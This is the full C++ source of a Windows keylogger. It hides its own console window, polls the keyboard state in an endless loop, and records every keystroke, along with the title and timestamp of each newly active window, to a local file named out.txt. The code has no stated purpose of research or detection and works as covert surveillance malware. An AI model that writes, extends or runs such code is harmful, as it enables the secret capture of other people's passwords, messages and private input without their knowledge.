#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
using namespace std;

// Lower Case Key & Some Other Keys
char* LowerCase[]={
	"b","e","[ESC]","[F1]","[F2]","[F3]","[F4]","[F5]","[F6]","[F7]",
	"[F8]","[F9]","[F10]","[F11]","[F12]","`","1","2","3","4",
	"5","6","7","8","9","0","-","=","[TAB]","q",
	"w","e","r","t","y","u","i","o","p","[",
	"]","a","s","d","f","g","h","j","k","l",
	";","'","z","x","c","v","b","n","m",",",
	".","/","\\","[CTRL]","[WIN]"," ","[WIN]","[Print Screen]","[Scroll Lock]","[Insert]",
	"[Home]","[PageUp]","[Del]","[End]","[PageDown]","[Left]","[UP]","[Right]","[Down]","[Num Lock]",
	"/","*","-","+","0","1","2","3","4","5",
	"6","7","8","9",".",
};

// Upper Case Key & Some Other Keys
char* UpperCase[]={
	"b","e","[ESC]","[F1]","[F2]","[F3]","[F4]","[F5]","[F6]","[F7]",
	"[F8]","[F9]","[F10]","[F11]","[F12]","~","!","@","#","$",
	"%","^","&","*","(",")","_","+","[TAB]","Q",
	"W","E","R","T","Y","U","I","O","P","{",
	"}","A","S","D","F","G","H","J","K","L",
	":","\"","Z","X","C","V","B","N","M","<",
	">",".?","|","[CTRL]","[WIN]"," ","[WIN]","[Print Screen]","[Scroll Lock]","[Insert]",
	"[Home]","[PageUp]","[Del]","[End]","[PageDown]","[Left]","[Up]","[Right]","[Down]","[Num Lock]",
	"/","*","-","+","0","1","2","3","4","5",
	"6","7","8","9",".",
};

// Ascii Keys,Forget About It
int SpecialKeys[]={
	8,13,27,112,113,114,115,116,117,118,
	119,120,121,122,123,192,49,50,51,52,
	53,54,55,56,57,48,189,187,9,81,
	87,69,82,84,89,85,73,79,80,219,
	221,65,83,68,70,71,72,74,75,76,
	186,222,90,88,67,86,66,78,77,188,
	190,191,220,17,91,32,92,44,145,45,
	36,33,46,35,34,37,38,39,40,144,
	111,106,109,107,96,97,98,99,100,101,
	102,103,104,105,110,
};

HWND PreviousFocus=NULL;
BOOL IsWindowsFocusChange();
BOOL KeyLogger();
ofstream out("out.txt", ios::out);





// ---------------------------------------------------------------------
int main(){
	HWND hSelf = GetForegroundWindow();   
	ShowWindow(hSelf,SW_HIDE);
	KeyLogger();   
	return 0;   
}
//-----------------------------------------------------------------------





// Purpose: To Check The Active Windows Title
BOOL IsWindowsFocusChange()
{

	//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
	HWND hFocus = GetForegroundWindow();   
	BOOL ReturnFlag = FALSE;   
	if (hFocus != PreviousFocus)   // The Active Windows Has Change
	{
	
		PreviousFocus = hFocus;    
		int WinLeng = GetWindowTextLength(hFocus);   
		char *WindowCaption = new char[WinLeng + 2]; 
		//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
		GetWindowText(hFocus,WindowCaption,(WinLeng + 1));     	  
		if (strlen(WindowCaption) > 0)   // Really Get The Windows's Caption
		{
			SYSTEMTIME stime;	
			GetLocalTime( &stime );
			out <<endl<<"The Active Windows Title:"<<endl;
			out << "(" << stime.wYear << "/" << stime.wMonth << "/" << stime.wDay << " ";
			out << stime.wHour << ":" << stime.wMinute << ":" << stime.wSecond << ")" <<WindowCaption<<endl; 
			
			ReturnFlag=TRUE;  
		}
		delete[] WindowCaption;     
	}
	return ReturnFlag;   // Return The Flag
}// End Of IsWindowsFocusChange Function





// Purpose: To Manage(Display)The Keys Retrieved From System's Key Buffer
BOOL KeyLogger()
{
	int bKstate[256] = {0};     // Declare The Key State Array
	int i,x;
	int state;   // Variable To Hode State Of Some Special Key Like CapsLock,Shift And ect
	int shift;   // Variable To Hode State Of Shift Key
	char KeyBuffer[600];     // Key Buffer Array
	memset(KeyBuffer,0,sizeof(KeyBuffer));	// Reset The Buffer

	while(TRUE)     // Forever Loop Is Taking Place Here
	{
		Sleep(8);  	  
		//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
		if (IsWindowsFocusChange())  
		{
			if (strlen(KeyBuffer) != 0)   // Keys Are Pressed
			{
				out<<KeyBuffer<<endl;
				memset(KeyBuffer,0,sizeof(KeyBuffer));     // reset The Buffer
			}
		}
		for(i=0;i<95;i++)     // Looping To Check Visual Keys
		{
			//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
			shift = GetKeyState(VK_SHIFT);   // Check Whether Shift Is Pressed
			x = SpecialKeys[i];   // Match The Key
			//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
			if (GetAsyncKeyState(x) & 0x8000)   // Check Combination Keys
			{
				//See Whether CapsLocak Or Shift Is Pressed
				//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift > -1) && (x > 64) && (x < 91)))   //Caps Lock And Shift Is Not Pressed
				{
					bKstate[x] = 1;     //Uppercase Characters A-Z
				} else
				//++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
				if (((GetKeyState(VK_CAPITAL) != 0) && (shift < 0) && (x > 64) && (x < 91)))   //Caps Lock And Shift Is Pressed
				{
					bKstate[x] = 2;     //Lowercase a-z
				} else
				if (shift < 0)   // Shift Is Pressed
				{
					bKstate[x] = 3;     //Uppercase Characters A-Z
				}
				else
					bKstate[x] = 4;     //Lowercase a-z
			} else
			{
				if (bKstate[x] != 0)     // No Combination Keys Detected
				{
					state = bKstate[x];   // Retrieve The Current State
					bKstate[x] = 0;   // Reset The Current State
					if (x == 8)     // Back Space Is Detected
					{
						KeyBuffer[strlen(KeyBuffer) - 1] = 0;   // One Key Back Then
						continue;   // Start A New Loop
					} else
					if (strlen(KeyBuffer) > 550)   // Buffer FULL
					{
						out<<KeyBuffer<<"<Buffer Full>";
						memset(KeyBuffer,0,sizeof(KeyBuffer));     // Reset The Buffer
						continue;   // Start A New Loop
					} else
					if (x == 13)   // Enter Is Detected
					{
						if (strlen(KeyBuffer) == 0)   // No Other Keys Retrieved But Enter
						{
							continue;   // Start A New Loop
						}
						out<<KeyBuffer<<"<Enter>"<<endl;
						memset(KeyBuffer,0,sizeof(KeyBuffer));   // Display The Keys With Enter
						continue;   // Start A New Loop
					}else
					if ((state%2) == 1)   //Must Be Upper Case Characters
					{
						strcat(KeyBuffer,UpperCase[i]);   // Store The Key To Key Buffer
					} else
					if ((state%2) == 0)   // Must Be Lower Case Characters
					{
						strcat(KeyBuffer,LowerCase[i]);   // Store The Key To Key Buffer
					}
				}
			}
		}// End Of For Loop
	}// End Of While Loop
	return TRUE;  
}

